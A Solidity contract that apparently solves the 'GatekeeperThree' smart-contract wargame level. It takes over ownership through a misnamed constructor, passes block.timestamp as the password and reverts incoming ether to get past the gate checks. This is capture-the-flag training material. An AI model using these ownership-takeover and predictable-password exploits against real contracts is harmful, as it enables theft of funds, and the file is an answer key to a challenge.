// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function enter() external;
    function getAllowance(uint256 _password) external;
    // function checkPassword(uint256 _password) external returns (bool);
}

contract EnterTheGate {
    IGatekeeperThree public gateKeeper;

    function setGateKeeper(address payable gateKeeperAddress) public {
        gateKeeper = IGatekeeperThree(gateKeeperAddress);
    }

    function setUpStuff() public payable {
        //become owner
        gateKeeper.construct0r();
        //deploy SimpleTrick
        gateKeeper.createTrick();
        //set allowEntrance to true in GateKeeperThree by passing the password,
        //which would be the block.timestamp since it's the same transaction as deployment
        gateKeeper.getAllowance(block.timestamp);
        // send 0.001 or more ether to GateKeeperThree
        payable(address(gateKeeper)).transfer(msg.value);
    }

    function enterTheGate() public {
        gateKeeper.enter();
    }

    receive() external payable {
        revert();
    }
}
